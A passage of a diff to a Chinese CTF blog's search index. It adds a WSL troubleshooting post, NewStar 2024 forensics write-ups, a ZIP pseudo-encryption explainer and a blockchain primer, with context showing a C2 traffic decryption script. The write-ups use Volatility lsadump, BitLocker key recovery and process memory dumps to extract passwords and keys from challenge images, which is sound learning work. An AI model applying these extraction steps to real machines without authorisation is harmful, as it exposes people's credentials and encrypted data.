-<h2 id="3-检查虚拟化支持"><a href="#3-检查虚拟化支持" class="headerlink" title="3.检查虚拟化支持"></a>3.<strong>检查虚拟化支持</strong></h2><p>确保启用了虚拟化支持</p>
-<h2 id="4-重置或重装-WSL"><a href="#4-重置或重装-WSL" class="headerlink" title="4.重置或重装 WSL"></a>4.<strong>重置或重装 WSL</strong></h2><p>实在不行重置 WSL：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --unregister &lt;你的发行版名称&gt;</span><br></pre></td></tr></table></figure>
-
-<p>或者重装 WSL：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --install</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="5-检查-Windows-服务"><a href="#5-检查-Windows-服务" class="headerlink" title="5.检查 Windows 服务"></a>5.检查 Windows 服务</h2><p>错误代码中提到 <strong>HCS_E_SERVICE_NOT_AVAILABLE</strong> 可能表明相关服务未运行：</p>
-<p>按 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Win + R</span><br></pre></td></tr></table></figure>
-
-<p> 键，输入 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">services.msc</span><br></pre></td></tr></table></figure>
-
-<p>，检查以下服务是否已启动：</p>
-<p><strong>Hyper-V Host Compute Service</strong></p>
-<p><strong>Virtual Machine Management</strong></p>
-<p>如果未启动，右键启动这些服务。</p>
-]]></content>
-      <tags>
-        <tag>wsl</tag>
-      </tags>
   </entry>
   <entry>
     <title>Network Traffic Analysis</title>
@@ -2425,7 +2273,7 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hexdump</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">SHARED_KEY = binascii.unhexlify(<span class="string">&quot;ef08974c0b06bd5127e04ceffe12597b&quot;</span>)</span><br><span class="line"><span class="comment">#AES key</span></span><br><span class="line">HMAC_KEY = binascii.unhexlify(<span class="string">&quot;bd87fa356596a38ac3e3bb0b6c3496e9&quot;</span>)</span><br><span class="line"><span class="comment">#HMAC key</span></span><br><span class="line">encrypt_data = <span class="string">&quot;AAAAwJPf9rLwWLpCMeOQAnZWZEHyu0x25chICHSk2Z3wgwVKXqHdSupVI8dRr30SPujp8iU6XM3PVEJ9FHxVaxVlfuJgfpKzVzLyY0G8CibFi/K88jg61kBkHDZBWThyIzYMwW/z3BSrHwDm7k+1P14Vt2e9N5RR0Ne29K6unbDD8w8+8We32z5qwkFkPtJRPnP56RSOvnr6oSLqdelFyKuKgWF55DGAJXvYvnUoJ90N4mgm1WEe4JOR7lVFiX2uHTqWmA==&quot;</span></span><br><span class="line"><span class="comment">#任务数据（解密过的）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">encrypted_data, iv_bytes, signature, shared_key, hmac_key</span>):</span><br><span class="line">    <span class="keyword">if</span> hmac.new(hmac_key, encrypted_data, digestmod=<span class="string">&quot;sha256&quot;</span>).digest()[:<span class="number">16</span>] != signature:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;message authentication failed&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    cipher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)</span><br><span class="line">    <span class="keyword">return</span> cipher.decrypt(encrypted_data)</span><br><span class="line"></span><br><span class="line">encrypt_data = base64.b64decode(encrypt_data)</span><br><span class="line">encrypt_data_length = <span class="built_in">int</span>.from_bytes(encrypt_data[:<span class="number">4</span>], byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">encrypt_data_l = encrypt_data[<span class="number">4</span>:]</span><br><span class="line"></span><br><span class="line">data1 = encrypt_data_l[:encrypt_data_length-<span class="number">16</span>]</span><br><span class="line">signature = encrypt_data_l[encrypt_data_length-<span class="number">16</span>:encrypt_data_length]</span><br><span class="line">iv_bytes = <span class="string">b&quot;abcdefghijklmnop&quot;</span></span><br><span class="line"></span><br><span class="line">dec = decrypt(data1, iv_bytes, signature, SHARED_KEY, HMAC_KEY)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;counter: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>.from_bytes(dec[:<span class="number">4</span>], byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;任务返回长度: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>.from_bytes(dec[<span class="number">4</span>:<span class="number">8</span>], byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;任务输出类型: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>.from_bytes(dec[<span class="number">8</span>:<span class="number">12</span>], byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)))</span><br><span class="line"><span class="built_in">print</span>(dec[<span class="number">12</span>:<span class="built_in">int</span>.from_bytes(dec[<span class="number">4</span>:<span class="number">8</span>], byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)])</span><br><span class="line"><span class="built_in">print</span>(hexdump.hexdump(dec))</span><br></pre></td></tr></table></figure>
 
 <p>就OK了</p>
-<p><strong>例题</strong>： 2023 SICTF 一起上号不         <strong>解析</strong>： <a href="https://metaviii.github.io/2024/11/Misc-Record/#%E6%9D%82%E9%A2%98">Misc Record | MetaVi</a></p>
+<p><strong>例题</strong>： 2023 SICTF 一起上号不         <strong>解析</strong>： <a href="https://metaviii.github.io/2024/11/Misc-Record/#%E6%9D%82%E9%A2%98">Misc Record | MetaVi</a> （在#杂题那）</p>
 ]]></content>
       <categories>
         <category>CTF</category>
@@ -2511,9 +2359,219 @@
       </tags>
   </entry>
   <entry>
-    <title>区块链学习</title>
-    <url>/2025/02/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[]]></content>
+    <title>wsl启动出错</title>
+    <url>/2024/12/wsl%E5%90%AF%E5%8A%A8%E5%87%BA%E9%94%99/</url>
+    <content><![CDATA[<h1 id="wsl启动出错"><a href="#wsl启动出错" class="headerlink" title="wsl启动出错"></a>wsl启动出错</h1><p><strong>启动出错如下：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">由于未安装所需的特性，无法启动操作。</span><br><span class="line">错误代码: Wsl/Service/CreateInstance/CreateVm/HCS/HCS_E_SERVICE_NOT_AVAILABLE</span><br><span class="line">Press any key to continue...</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="1-启用了-WSL-所需的功能"><a href="#1-启用了-WSL-所需的功能" class="headerlink" title="1.启用了 WSL 所需的功能"></a>1.启用了 WSL 所需的功能</h2><p>可以以管理员身份在powershell输入以下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart</span><br><span class="line">dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart</span><br></pre></td></tr></table></figure>
+
+<p>然后重启电脑，看wsl还能运行吗</p>
+<p>我是运行了这个就好了，界面：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32&gt;dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart</span><br><span class="line"></span><br><span class="line">部署映像服务和管理工具</span><br><span class="line">版本: 10.0.26100.1150</span><br><span class="line"></span><br><span class="line">映像版本: 10.0.26100.2454</span><br><span class="line"></span><br><span class="line">启用一个或多个功能</span><br><span class="line">[==========================100.0%==========================]</span><br><span class="line">操作成功完成。</span><br><span class="line"></span><br><span class="line">C:\Windows\System32&gt;dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart</span><br><span class="line"></span><br><span class="line">部署映像服务和管理工具</span><br><span class="line">版本: 10.0.26100.1150</span><br><span class="line"></span><br><span class="line">映像版本: 10.0.26100.2454</span><br><span class="line"></span><br><span class="line">启用一个或多个功能</span><br><span class="line">[==========================100.0%==========================]</span><br><span class="line">操作成功完成。</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-更新-WSL-核心"><a href="#2-更新-WSL-核心" class="headerlink" title="2.更新 WSL 核心"></a>2.更新 WSL 核心</h2><p>WSL 需要最新版本的核心来支持虚拟机实例。更新核心：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --update</span><br></pre></td></tr></table></figure>
+
+<p>运行后检查版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --version</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="3-检查虚拟化支持"><a href="#3-检查虚拟化支持" class="headerlink" title="3.检查虚拟化支持"></a>3.<strong>检查虚拟化支持</strong></h2><p>确保启用了虚拟化支持</p>
+<h2 id="4-重置或重装-WSL"><a href="#4-重置或重装-WSL" class="headerlink" title="4.重置或重装 WSL"></a>4.<strong>重置或重装 WSL</strong></h2><p>实在不行重置 WSL：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --unregister &lt;你的发行版名称&gt;</span><br></pre></td></tr></table></figure>
+
+<p>或者重装 WSL：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --install</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="5-检查-Windows-服务"><a href="#5-检查-Windows-服务" class="headerlink" title="5.检查 Windows 服务"></a>5.检查 Windows 服务</h2><p>错误代码中提到 <strong>HCS_E_SERVICE_NOT_AVAILABLE</strong> 可能表明相关服务未运行：</p>
+<p>按 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Win + R</span><br></pre></td></tr></table></figure>
+
+<p> 键，输入 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">services.msc</span><br></pre></td></tr></table></figure>
+
+<p>，检查以下服务是否已启动：</p>
+<p><strong>Hyper-V Host Compute Service</strong></p>
+<p><strong>Virtual Machine Management</strong></p>
+<p>如果未启动，右键启动这些服务。</p>
+]]></content>
+      <tags>
+        <tag>wsl</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>newstar2024小明同学们复现</title>
+    <url>/2024/12/newstar2024%E5%B0%8F%E6%98%8E%E5%90%8C%E5%AD%A6%E4%BB%AC%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p>主要最近发现自己的取证题目比较薄弱，于是拿小明同学们练练手。</p>
+<h1 id="1-热心助人的小明同学"><a href="#1-热心助人的小明同学" class="headerlink" title="1.热心助人的小明同学"></a><u>1.热心助人的小明同学</u></h1><p>这个很简单，只要装好vol2，然后lsadump看密码就好</p>
+<p>先看操作版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vol.py -f image.raw imageinfo</span><br></pre></td></tr></table></figure>
+
+<img src="屏幕截图 2024-12-20 140254.png" alt="屏幕截图 2024-12-20 140254" style="zoom:67%;">
+
+<p>看到操作版本是 Win7SP1x86_23418</p>
+<p>然后直接lsadump就好</p>
+<img src="屏幕截图 2024-12-20 140511.png" alt="屏幕截图 2024-12-20 140511" style="zoom:75%;">
+
+<p>密码：ZDFyVDlfdTNlUl9wNHNTdzByRF9IQUNLRVIh（开头的0x48不是密码）</p>
+<p>所以flag：flag{ZDFyVDlfdTNlUl9wNHNTdzByRF9IQUNLRVIh}</p>
+<h1 id="2-擅长音游的小明同学"><a href="#2-擅长音游的小明同学" class="headerlink" title="2.擅长音游的小明同学"></a><u>2.擅长音游的小明同学</u></h1><p>拿到一个chal_fixed.E01文件，使用FTK挂载 （最好用4.2版本的</p>
+<p>在win7那个下面的<code>root/users/desktop</code>可以看到</p>
+<img src="屏幕截图 2025-01-04 210938.png" alt="屏幕截图 2025-01-04 210938" style="zoom:75%;">
+
+<blockquote>
+<p>[!NOTE]</p>
+<p>真相.txt</p>
+<p>真相会不经意间流入日常的点点滴滴……<br>真相在哪里?</p>
+</blockquote>
+<blockquote>
+<p>[!NOTE]</p>
+<p>要开始了呦.txt</p>
+<p>今天舞萌彩框了好开心啊o(<em>￣▽￣</em>)ブ<br>我要把这一刻用照片保存下来<br>不过在拍摄rating变化的瞬间总感觉有什么东西藏进照片里了<br>打开也没发现什么异常，但是体积好像变大了一点<br>是错觉吗？</p>
+</blockquote>
+<p>可以发现跟图片有关，而在照片文件里面找到ColorfulDog.jpg</p>
+<img src="屏幕截图 2025-01-04 211404.png" alt="屏幕截图 2025-01-04 211404" style="zoom:75%;">
+
+<p>没啥思路了binwalk一下（感觉挺正常的</p>
+<p>发现一个txt内容是：</p>
+<p>听好了听好了听好了听好了听好了听好了听好了： 1919年8月10日，世界就此陷落， 陷落的世界都将迎来一场漩涡， 为这个世界带来有关弗拉格尚未知晓的真相。 但发掘真相的道路被加诸混沌的历练 世界的宽高未被正确丈量 当真相被混沌打乱时 真相将不复存在 也许，在世界的重置和轮回中能找到发现真相的方法…… 至此，尘埃落定 至此，一锤定音 #音游# #NewStarcaea# #Misc#</p>
+<p>然后我们挂载这个E01，注意要在FTK上右键加载镜像，进行加载</p>
+<img src="屏幕截图 2025-01-05 132008.png" alt="屏幕截图 2025-01-05 132008" style="zoom:75%;">
+
+<p>使用VM挂载一下，注意要用管理员运行。</p>
+<p>这里要选择UEFI</p>
+<img src="屏幕截图 2025-01-05 132348.png" alt="屏幕截图 2025-01-05 132348" style="zoom:75%;">
+
+<p>挂载出问题了。。。</p>
+<h1 id="3-擅长加密的小明同学"><a href="#3-擅长加密的小明同学" class="headerlink" title="3.擅长加密的小明同学"></a><u>3.擅长加密的小明同学</u></h1><p>拿到了一个vhd和一个君は加密本当に上手だな.zip，解压得到一个raw文件</p>
+<p>vhd双击打开发现要BitLocker解密，我们使用Elcomsoft Forensic Disk Decryptor</p>
+<p>选择<code>decrypt or mount disk / image file of disk\partition</code></p>
+<img src="屏幕截图 2025-01-05 144711.png" alt="屏幕截图 2025-01-05 144711" style="zoom:50%;">
+
+<p>进行恢复，得到key：408320-285065-614779-610940-547107-218229-492195-125422</p>
+<p>输入恢复密钥之后得到了一个flag.7z，解压需要密码。</p>
+<p>7z在密码复杂的情况下几乎不可能被爆破出来，所以我们看raw文件。</p>
+<p>查看操作版本</p>
+<img src="屏幕截图 2025-01-28 161649.png" alt="屏幕截图 2025-01-28 161649" style="zoom:80%;">
+
+<p>查看有什么进程</p>
+<img src="屏幕截图 2025-01-28 161823.png" alt="屏幕截图 2025-01-28 161823" style="zoom:80%;">
+
+<p>看到有一个mspaint.exe（画图进程），我们提取出来，使用 memdump：</p>
+<img src="屏幕截图 2025-01-28 162129.png" alt="屏幕截图 2025-01-28 162129" style="zoom:80%;">
+
+<p>然后改后缀为data，拉入GIMP.</p>
+<p>图像类型选择RGB透明，拉X,Y,Z，最后得到：</p>
+<img src="屏幕截图 2025-01-28 162730.png" alt="屏幕截图 2025-01-28 162730" style="zoom:80%;">
+
+<p>压缩包密码：<code>rxnifbeiyomezpplugho</code></p>
+<p>解压出来得到：flag{5ZCb44Gv5Y+W6K+B5pys5b2T44Gr5LiK5omL}</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>WP</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
+        <tag>CTF</tag>
+        <tag>WP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>关于ZIP伪加密</title>
+    <url>/2025/02/%E5%85%B3%E4%BA%8EZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/</url>
+    <content><![CDATA[<p>ZIP伪加密看似简单，实则也是大有学问在里面</p>
+<p>这里细节讲解一下伪加密和相关工具的使用</p>
+<p>首先我们需要了解一下zip文件结构</p>
+<h1 id="zip文件结构"><a href="#zip文件结构" class="headerlink" title="zip文件结构"></a>zip文件结构</h1><p>zip文件结构大致分为三个部分</p>
+<p>一个<code>record区</code>，一个<code>dirEntry区</code>，一个<code>endLocator区</code></p>
+<p>三个部分相互依存，这里是010下的zip文件对照表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+ ZIPFILERECORD record # 压缩源文件数据区</span><br><span class="line">    - char frSignature[4] # 压缩源文件标志</span><br><span class="line">    - ushort frVersion # 压缩源文件版本</span><br><span class="line">    - ushort frFlags # 压缩源文件标志 （有无加密，这个更改这里进行伪加密，改为01 00打开就会提示有密码了）</span><br><span class="line">    - enum COMPTYPE frCompression</span><br><span class="line">    - DOSTIME frFileTime # 压缩源文件时间</span><br><span class="line">    - DOSDATE frFileDate # 压缩源文件日期</span><br><span class="line">    - uint frCrc # 压缩源文件CRC32校验值</span><br><span class="line">    - uint frCompressedSize # 压缩源文件压缩后大小</span><br><span class="line">    - uint frUncompressedSize # 压缩源文件压缩前大小</span><br><span class="line">    - ushort frFileNameLength # 压缩源文件名长度</span><br><span class="line">    - ushort frExtraFieldLength # 压缩源文件扩展域长度</span><br><span class="line">    - char frFileName[frFileNameLength] # 压缩源文件名</span><br><span class="line">    - uchar frData[frCompressedSize] # 压缩源文件数据</span><br><span class="line">+ ZIPDIRENTRY dirEntry # 压缩源文件目录区</span><br><span class="line">    - char deSignature[4] # 目录标志</span><br><span class="line">    - ushort deVersionMadeBy # 创建该条目的版本</span><br><span class="line">    - ushort deVersionNeeded # 解压该条目所需的版本</span><br><span class="line">    - ushort deFlags # 标志位 (判断是不是伪加密的位置，如果是真加密则两个都是0900，伪加密这个则是0000或0100)</span><br><span class="line">    - enum COMPTYPE deCompression # 压缩方法</span><br><span class="line">    - DOSTIME deFileTime # 最后修改时间</span><br><span class="line">    - DOSDATE deFileDate # 最后修改日期</span><br><span class="line">    - uint deCrc # CRC32校验值</span><br><span class="line">    - uint deCompressedSize # 压缩后的大小</span><br><span class="line">    - uint deUncompressedSize # 压缩前的大小</span><br><span class="line">    - ushort deFileNameLength # 文件名长度</span><br><span class="line">    - ushort deExtraFieldLength # 扩展域长度</span><br><span class="line">    - ushort deFileCommentLength # 文件评论长度</span><br><span class="line">    - ushort deDiskNumberStart # 起始磁盘编号</span><br><span class="line">    - ushort deInternalAttributes # 内部属性</span><br><span class="line">    - uint deExternalAttributes # 外部属性</span><br><span class="line">    - uint deRelativeOffset # 该条目在 ZIP 文件中的偏移位置</span><br><span class="line">    - char deFileName[deFileNameLength] # 文件名</span><br><span class="line">    - char deExtraField[deExtraFieldLength] # 扩展域</span><br><span class="line">    - char deFileComment[deFileCommentLength] # 文件评论</span><br><span class="line">+ ZIPENDLOCATOR endLocator # 压缩源文件目录结束标志</span><br><span class="line">    - char elSignature[4] # 结束标志</span><br><span class="line">    - ushort elDiskNumber # 当前磁盘编号</span><br><span class="line">    - ushort elStartDiskNumber # 目录开始的磁盘编号</span><br><span class="line">    - ushort elEntriesOnDisk # 当前磁盘上的条目数量</span><br><span class="line">    - ushort elEntriesTotal # 总条目数量</span><br><span class="line">    - uint elSizeOfDirectory # 目录的总大小</span><br><span class="line">    - uint elOffsetOfDirectory # 目录开始的偏移位置</span><br><span class="line">    - ushort elCommentLength # 注释长度</span><br><span class="line">    - char elComment[elCommentLength] # 注释</span><br></pre></td></tr></table></figure>
+
+<p>可以发现最重要的就是两个标志位了，他们是判断伪加密的标准</p>
+<p>其实其余部分也很重要，因为如果不对应的话直接解压会发现报错——CRC校验错误</p>
+<p>首先我们要知道</p>
+<blockquote>
+<p>全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性，即：<br>                                             <strong>第二个数字为奇数时 –&gt;加密</strong><br>                                             <strong>第二个数字为偶数时 –&gt;未加密</strong></p>
+</blockquote>
+<p>也就是说，0900&#x2F;0100代表着加密，0000&#x2F;0800代表着无加密</p>
+<p>而<strong>伪加密就是把本来无加密的文件修改了标志位从而显示出加密的样子</strong></p>
+<p>那我们怎么修改伪加密呢？为什么有些工具可以直接解压有些却不行呢？</p>
+<h1 id="工具选择"><a href="#工具选择" class="headerlink" title="工具选择"></a>工具选择</h1><h2 id="010editor"><a href="#010editor" class="headerlink" title="010editor"></a>010editor</h2><p>010editor肯定是最普遍和最准确的修改伪加密的东西了</p>
+<p>如果是伪加密的话直接010修改0900为0000</p>
+<p>如果两区（record和dirEntry）都是0900直接全改即可</p>
+<h2 id="bandizip"><a href="#bandizip" class="headerlink" title="bandizip"></a>bandizip</h2><p>经过测试，bandizip识别一个文件是否加密是通过看<strong>dirEntry记录中的deflag位</strong></p>
+<p>如果deFlag位是加密的话无论另一个frflag是否是加密bandizip都会识别为加密</p>
+<h2 id="winRAR"><a href="#winRAR" class="headerlink" title="winRAR"></a>winRAR</h2><p>winRAR和bandizip一样，都是识别dirEntry记录中的deflag位</p>
+<h2 id="7zip"><a href="#7zip" class="headerlink" title="7zip"></a>7zip</h2><p>7z就很神奇，它与上面两个工具不同。</p>
+<p><strong>7zip判断是否为加密的方式是看record记录中的frflag位</strong></p>
+<p>因此有些明明是伪加密的zip 7z却能直接解压</p>
+<p>所以那句“不会出的出题人只修改一个struct区”是因为换个工具就能解压</p>
+<h2 id="随波逐流"><a href="#随波逐流" class="headerlink" title="随波逐流"></a>随波逐流</h2><p>经过测试，随波逐流提供的伪加密修复<strong>只会修改dirEntry记录中的deflag位</strong>，而不管frFlag位</p>
+<h2 id="ZipCenOp"><a href="#ZipCenOp" class="headerlink" title="ZipCenOp"></a>ZipCenOp</h2><p><strong>不好用！！</strong></p>
+<p>运行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ZipCenOp.jar -r 111.zip</span><br></pre></td></tr></table></figure>
+
+<p>会显示</p>
+<p>success 1 flag(s) found</p>
+<p>但是它不帮我改，有啥用？。。</p>
+<h2 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h2><p>传闻2345好压改两个区也能直接开。而且还有360解压缩</p>
+<p>然而我不敢尝试，怕删不干净。。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>区块链Blockchain学习</title>
+    <url>/2025/02/%E5%8C%BA%E5%9D%97%E9%93%BEBlockchain%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<p>怎么现在的misc区块链内容越来越多了，不得不学了</p>
+<h1 id="什么是区块链？"><a href="#什么是区块链？" class="headerlink" title="什么是区块链？"></a>什么是区块链？</h1><p><strong>区块链</strong>（英语：blockchain或block chain）是借由<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A2%BC%E5%AD%B8">密码学</a>与<a href="https://zh.wikipedia.org/wiki/%E5%85%B1%E8%AD%98%E6%A9%9F%E5%88%B6">共识机制</a>等技术建立与存储庞大交易资料链的<a href="https://zh.wikipedia.org/wiki/%E5%B0%8D%E7%AD%89%E7%B6%B2%E8%B7%AF">点对点</a>网络系统。</p>
+<p><strong>从字面上看：</strong>区块链是由一个个记录着各种信息的小区块链接起来组成的一个链条，类似于我们将一块块砖头叠起来，而且叠起来后是没办法拆掉的，每个砖头上面还写着各种信息，包括：谁叠的，什么时候叠的，砖头用了什么材质等等，这些信息你也没办法修改。</p>
+<p><strong>从计算机上看：</strong>区块链是一种比较特殊的分布式数据库。分布式数据库就是将数据信息单独放在每台计算机，且存储的信息的一致的，如果有一两台计算机坏掉了，信息也不会丢失，你还可以在其他计算机上查看到。</p>
+<p>区块链是一种分布式的，所以它是没有中心点的，信息存储在所有加入到区块链网络的节点当中，节点的数据是同步的。节点可以是一台服务器，笔记本电脑，手机等。</p>
+<p><strong>有没一两句话能说明白区块链的？</strong></p>
+<p>有的。</p>
+<p>麻将作为中国传统的区块链项目，四个矿工一组，先碰撞出13个数字正确哈希值的矿工可以获得记账权并得到奖励。</p>
+<h1 id="基本名词-工具使用"><a href="#基本名词-工具使用" class="headerlink" title="基本名词&amp;&amp;工具使用"></a>基本名词&amp;&amp;工具使用</h1><h2 id="钱包"><a href="#钱包" class="headerlink" title="钱包"></a>钱包</h2><p>顾名思义就是存储钱的钱包</p>
+<p>这里推荐使用MetaMask，chrome浏览器上的一个插件。</p>
+<img src="屏幕截图 2025-02-09 182036.png" alt="屏幕截图 2025-02-09 182036" style="zoom:80%;">
+
+<p>应该也可以使用 imtoken ，手机上的钱包</p>
+<p>注意每个钱包有一个地址，是收款的地址。而且注册账号时会让你记一些<strong>助记词</strong>，用来在忘记密码（私钥）的时候找回密码或钱包。</p>
+<p><strong>切换网络</strong></p>
+<p>在写CTF题目时候可以看比赛题目部署在哪个网路上，可以点击metamask左上角切换网络</p>
+<img src="屏幕截图 2025-02-09 182359.png" alt="屏幕截图 2025-02-09 182359" style="zoom: 50%;">
+
+<p>这个主要看比赛的网路。</p>
+<h3 id="如何获取以太币？"><a href="#如何获取以太币？" class="headerlink" title="如何获取以太币？"></a>如何获取以太币？</h3><p>主要有一些水龙头可以每日拿一点，网上可以搜到</p>
+<p>1.<a href="https://zan.top/faucet">ZAN Faucet - Get Ethereum Testnet and Solana Devnet Tokens</a></p>
+<p>2.<a href="https://www.alchemy.com/faucets/ethereum-sepolia">Ethereum Sepolia Faucet</a></p>
+<h3 id="助记词"><a href="#助记词" class="headerlink" title="助记词"></a>助记词</h3><p>助记词是从建立账户的时候自动生成的，一般是12个或者24个，用来帮助找回密码。</p>
+<p>但是助记词并不是随机生成的，而是有一定的规律的，而且助记词是有范围的，一共2048个</p>
+<p>这里是所有2048个助记词（英文）： <a href="https://github.com/bitcoin/bips/blob/master/bip-0039/english.txt">bips&#x2F;bip-0039&#x2F;english.txt at master · bitcoin&#x2F;bips</a></p>
+<p>如果从题目中拿到的一些助记词可以从这里缩小范围。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Blockchain</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Blockchain</tag>
+      </tags>
   </entry>
   <entry>
     <title>哲学-维特根斯坦</title>
@@ -2578,51 +2636,30 @@
       </tags>
   </entry>
   <entry>
-    <title>关于ZIP伪加密</title>
-    <url>/2025/02/%E5%85%B3%E4%BA%8EZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/</url>
-    <content><![CDATA[<p>ZIP伪加密看似简单，实则也是大有学问在里面</p>
-<p>这里细节讲解一下伪加密和相关工具的使用</p>
-<p>首先我们需要了解一下zip文件结构</p>
-<h1 id="zip文件结构"><a href="#zip文件结构" class="headerlink" title="zip文件结构"></a>zip文件结构</h1><p>zip文件结构大致分为三个部分</p>
-<p>一个<code>record区</code>，一个<code>dirEntry区</code>，一个<code>endLocator区</code></p>
-<p>三个部分相互依存，这里是010下的zip文件对照表</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+ ZIPFILERECORD record # 压缩源文件数据区</span><br><span class="line">    - char frSignature[4] # 压缩源文件标志</span><br><span class="line">    - ushort frVersion # 压缩源文件版本</span><br><span class="line">    - ushort frFlags # 压缩源文件标志 （有无加密，这个更改这里进行伪加密，改为01 00打开就会提示有密码了）</span><br><span class="line">    - enum COMPTYPE frCompression</span><br><span class="line">    - DOSTIME frFileTime # 压缩源文件时间</span><br><span class="line">    - DOSDATE frFileDate # 压缩源文件日期</span><br><span class="line">    - uint frCrc # 压缩源文件CRC32校验值</span><br><span class="line">    - uint frCompressedSize # 压缩源文件压缩后大小</span><br><span class="line">    - uint frUncompressedSize # 压缩源文件压缩前大小</span><br><span class="line">    - ushort frFileNameLength # 压缩源文件名长度</span><br><span class="line">    - ushort frExtraFieldLength # 压缩源文件扩展域长度</span><br><span class="line">    - char frFileName[frFileNameLength] # 压缩源文件名</span><br><span class="line">    - uchar frData[frCompressedSize] # 压缩源文件数据</span><br><span class="line">+ ZIPDIRENTRY dirEntry # 压缩源文件目录区</span><br><span class="line">    - char deSignature[4] # 目录标志</span><br><span class="line">    - ushort deVersionMadeBy # 创建该条目的版本</span><br><span class="line">    - ushort deVersionNeeded # 解压该条目所需的版本</span><br><span class="line">    - ushort deFlags # 标志位 (判断是不是伪加密的位置，如果是真加密则两个都是0900，伪加密这个则是0000或0100)</span><br><span class="line">    - enum COMPTYPE deCompression # 压缩方法</span><br><span class="line">    - DOSTIME deFileTime # 最后修改时间</span><br><span class="line">    - DOSDATE deFileDate # 最后修改日期</span><br><span class="line">    - uint deCrc # CRC32校验值</span><br><span class="line">    - uint deCompressedSize # 压缩后的大小</span><br><span class="line">    - uint deUncompressedSize # 压缩前的大小</span><br><span class="line">    - ushort deFileNameLength # 文件名长度</span><br><span class="line">    - ushort deExtraFieldLength # 扩展域长度</span><br><span class="line">    - ushort deFileCommentLength # 文件评论长度</span><br><span class="line">    - ushort deDiskNumberStart # 起始磁盘编号</span><br><span class="line">    - ushort deInternalAttributes # 内部属性</span><br><span class="line">    - uint deExternalAttributes # 外部属性</span><br><span class="line">    - uint deRelativeOffset # 该条目在 ZIP 文件中的偏移位置</span><br><span class="line">    - char deFileName[deFileNameLength] # 文件名</span><br><span class="line">    - char deExtraField[deExtraFieldLength] # 扩展域</span><br><span class="line">    - char deFileComment[deFileCommentLength] # 文件评论</span><br><span class="line">+ ZIPENDLOCATOR endLocator # 压缩源文件目录结束标志</span><br><span class="line">    - char elSignature[4] # 结束标志</span><br><span class="line">    - ushort elDiskNumber # 当前磁盘编号</span><br><span class="line">    - ushort elStartDiskNumber # 